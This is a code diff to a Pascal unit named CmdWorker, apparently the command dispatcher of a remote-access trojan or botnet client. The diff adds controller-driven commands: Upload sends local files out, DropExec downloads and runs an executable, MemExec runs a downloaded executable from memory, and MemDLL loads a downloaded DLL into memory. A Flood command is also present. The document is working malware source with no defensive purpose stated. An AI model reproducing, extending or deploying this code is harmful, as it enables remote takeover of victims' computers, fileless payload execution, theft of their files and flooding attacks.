@@ -5,8 +5,9 @@ unit CmdWorker;
 interface
 
 uses
-  NetModule, Tools, Debug,
-  Classes, SysUtils, IdMultipartFormData, Process, IdHTTP;
+  NetModule, Tools,
+  Classes, SysUtils, IdMultipartFormData, Process, IdHTTP, WExecFromMem,
+  BTMemoryModule;
 
 type
   TCmdWorker = class(TThread)
@@ -15,6 +16,7 @@ type
   private
     FCmdID: String;
     FIndex: LongInt;
+    procedure DownloadFile(URL: String; var MS: TMemoryStream);
   public
     property Identifier: String read FCmdID write FCmdID;
     constructor Create(CmdID: String; Index: LongInt);
@@ -35,7 +37,14 @@ implementation
 
 //Functions used by commands
 
-
+procedure TCmdWorker.DownloadFile(URL: String; var MS: TMemoryStream);
+Begin
+  try
+    Hat.Get(URL, MS);
+  except
+  end;
+  MS.Position:=0;
+end;
 
 //General functions and Command Execution
 
@@ -77,6 +86,7 @@ Begin
   FCmdID:=CmdID;
   FIndex:=Index;
   Hat:=TIdHTTP.Create(Nil);
+  Hat.HandleRedirects:=True;
   inherited Create(False);
 end;
 
@@ -108,6 +118,9 @@ var
   Master: TProcess;
   MemStream: TMemoryStream;
   Error: Boolean = False;
+
+  MemDLLData: Pointer;
+  MemDLLModule: PBTMemoryModule;
 
   procedure DoPost;
   Begin
@@ -147,7 +160,7 @@ Begin
       ToPost.AddFormField('RT', '1');
       MemStream:=TMemoryStream.Create;
       try
-        Net.DownloadFile(
+        DownloadFile(
             Net.Commands.ReadString(FCmdID, 'URL', ''),
             MemStream);
         RenameFile(FullName, FileName+'.old');
@@ -169,6 +182,109 @@ Begin
     'Uninstall': Begin
 
     end;
+    'Upload': Begin
+      ToPost.AddFormField('RT', '2');
+      ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
+      DoPost;
+    end;
+    'Download': Begin
+      ToPost.AddFormField('RT', '1');
+      MemStream:=TMemoryStream.Create;
+      try
+        DownloadFile(
+            Net.Commands.ReadString(FCmdID, 'URL', ''),
+            MemStream);
+        MemStream.SaveToFile(Net.Commands.ReadString(FCmdID, 'LocalName', 'Temp.tmp'));
+      except
+        on E: Exception do Begin
+          Error:=True;
+          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
+        end;
+      end;
+      MemStream.Free;
+      if Not(Error) then
+        ToPost.AddFormField('Result', 'Download successful.');
+      DoPost;
+    end;
+    'DropExec': Begin
+      ToPost.AddFormField('RT', '1');
+      MemStream:=TMemoryStream.Create;
+      try
+        DownloadFile(
+            Net.Commands.ReadString(FCmdID, 'URL', ''),
+            MemStream);
+        MemStream.SaveToFile('Drop.exe');
+      except
+        on E: Exception do Begin
+          Error:=True;
+          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
+        end;
+      end;
+      MemStream.Free;
+      if Not(Error) then Begin
+        if FileExists('Drop.exe') then Begin
+          Master:=TProcess.Create(Nil);
+          try
+            Master.Executable:='Drop.exe';
+            Master.InheritHandles:=False;
+            Master.Execute;
+          except
+            on E: Exception do Begin
+              Error:=True;
+              ToPost.AddFormField('Result', 'Execution failed: '+E.Message);
+            end;
+          end;
+          Master.Free;
+          if Not(Error) then ToPost.AddFormField('Result', 'Execution successful.');
+        end else ToPost.AddFormField('Result', 'The dropped file doesn''t exist!');
+      end;
+      DoPost;
+    end;
+    'MemExec': Begin
+      ToPost.AddFormField('RT', '1');
+      MemStream:=TMemoryStream.Create;
+      try
+        DownloadFile(
+            Net.Commands.ReadString(FCmdID, 'URL', ''),
+            MemStream);
+      except
+        on E: Exception do Begin
+          Error:=True;
+          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
+        end;
+      end;
+      if Not(Error) then Begin
+        if(ExecFromMem(FullName, '', MemStream.Memory)<>0) then
+        ToPost.AddFormField('Result', 'Execution successful.')
+        else ToPost.AddFormField('Result', 'Execution failed!');
+      End;
+      MemStream.Free;
+      DoPost;
+    end;
+    'MemDLL': Begin
+      ToPost.AddFormField('RT', '1');
+      MemStream:=TMemoryStream.Create;
+      try
+        DownloadFile(
+            Net.Commands.ReadString(FCmdID, 'URL', ''),
+            MemStream);
+      except
+        on E: Exception do Begin
+          Error:=True;
+          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
+        end;
+      end;
+      if Not(Error) then Begin
+        MemDLLData:=GetMemory(MemStream.Size);
+        MemStream.Read(MemDLLData^, MemStream.Size);
+        MemDLLModule:=BTMemoryModule.BTMemoryLoadLibary(MemDLLData, MemStream.Size);
+        if MemDLLModule<>Nil then
+        ToPost.AddFormField('Result', 'Execution successful.')
+        else ToPost.AddFormField('Result', 'Failed to load the DLL into memory!');
+      end;
+      MemStream.Free;
+      DoPost;
+    end;
     'Flood': Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result', 'This is going to take a long time!');
@@ -179,16 +295,8 @@ Begin
       ToPost.AddFormField('Result', 'All done!');
       DoPost;
     end;
-    'Upload': Begin
-      Writeln('It wants me to upload ',Net.Commands.ReadString(FCmdID, 'FileName', ''));
-      ToPost.AddFormField('RT', '2');
-      ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
-      DoPost;
-    end;
     'Ping': Begin
-      ToPost.AddFormField('RT', '1');
-      ToPost.AddFormField('Result', 'Pong!');
-      DoPost;
+
     end
     else Begin
       ToPost.AddFormField('RT', '1');
